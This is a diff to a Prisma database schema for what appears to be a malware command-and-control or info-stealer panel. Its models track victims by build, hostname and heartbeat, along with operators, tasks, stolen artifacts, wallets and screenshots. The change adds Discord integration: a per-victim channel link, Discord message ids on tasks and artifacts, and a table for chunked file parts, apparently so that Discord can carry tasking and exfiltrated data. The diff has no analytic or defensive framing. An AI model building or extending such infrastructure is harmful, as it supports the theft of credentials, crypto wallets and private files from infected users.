@@ -154,6 +154,7 @@ model Victim {
   screenshots     Screenshot[]
   events          Event[]
   notifications   Notification[]
+  discord         DiscordLink?
 
   @@unique([buildId, hostname, username])
   @@index([status, lastHeartbeatAt])
@@ -193,6 +194,7 @@ model Task {
   victim      Victim     @relation(fields: [victimId], references: [id], onDelete: Cascade)
   createdBy   Operator?  @relation(fields: [createdById], references: [id], onDelete: SetNull)
   artifacts   Artifact[]
+  discordMessageId String?
 
   @@index([victimId, status, createdAt])
   @@index([status, notBefore])
@@ -220,7 +222,9 @@ model Upload {
 model Artifact {
   id            String         @id @default(uuid()) @db.Uuid
   victimId      String         @db.Uuid
-  uploadId      String         @unique @db.Uuid
+  uploadId      String?        @unique @db.Uuid
+  source        String         @default("api")
+  discordMessageId String?     @unique
   taskId        String?        @db.Uuid
   module        String
   bytes         Int
@@ -233,7 +237,7 @@ model Artifact {
   processedAt   DateTime?
   victim        Victim         @relation(fields: [victimId], references: [id], onDelete: Cascade)
   task          Task?          @relation(fields: [taskId], references: [id], onDelete: SetNull)
-  upload        Upload         @relation(fields: [uploadId], references: [id], onDelete: Cascade)
+  upload        Upload?        @relation(fields: [uploadId], references: [id], onDelete: Cascade)
   wallets       Wallet[]
   screenshots   Screenshot[]
 
@@ -330,6 +334,30 @@ model Notification {
   operator   Operator? @relation(fields: [operatorId], references: [id], onDelete: Cascade)
 
   @@index([readAt, createdAt])
+}
+
+model DiscordLink {
+  id            String   @id @default(uuid()) @db.Uuid
+  channelId     String   @unique
+  guildId       String
+  victimId      String   @unique @db.Uuid
+  lastMessageId String   @default("0")
+  createdAt     DateTime @default(now())
+  victim        Victim   @relation(fields: [victimId], references: [id], onDelete: Cascade)
+
+  @@index([guildId])
+}
+
+model DiscordPart {
+  id        String   @id @default(uuid()) @db.Uuid
+  channelId String
+  base      String
+  index     Int
+  path      String
+  createdAt DateTime @default(now())
+
+  @@unique([channelId, base, index])
+  @@index([channelId, base])
 }
 
 model AuditLog {
